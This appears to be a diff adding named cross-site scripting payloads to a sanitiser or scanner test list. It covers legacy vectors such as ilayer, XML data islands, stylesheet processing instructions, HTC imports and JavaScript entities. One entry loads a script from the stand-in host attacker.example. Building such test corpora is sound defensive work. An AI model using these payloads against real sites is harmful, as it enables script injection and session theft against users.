+== ilayer-src-hit
+<ilayer src="{{HIT}}"></ilayer>
+
+== xml-src-hit
+<xml id=x src="{{HIT}}"></xml>
+
+== xml-data-island
+<xml id=i><x><c><![CDATA[<img src=x onerror=alert(1)>]]></c></x></xml><span datasrc="#i" datafld=c dataformatas=html></span>
+
+== xml-stylesheet-pi
+<?xml-stylesheet href="{{HIT}}"?><p>x</p>
+
+== htc-import-namespace
+<html xmlns:xss><?import namespace="xss" implementation="{{HIT}}"><xss:xss>x</xss:xss></html>
+
+== br-size-js-entity
+<br size="&{alert(1)}">
+
+== attacker-host-script
+<script src="http://attacker.example/x.js"></script><img src="{{HIT}}">
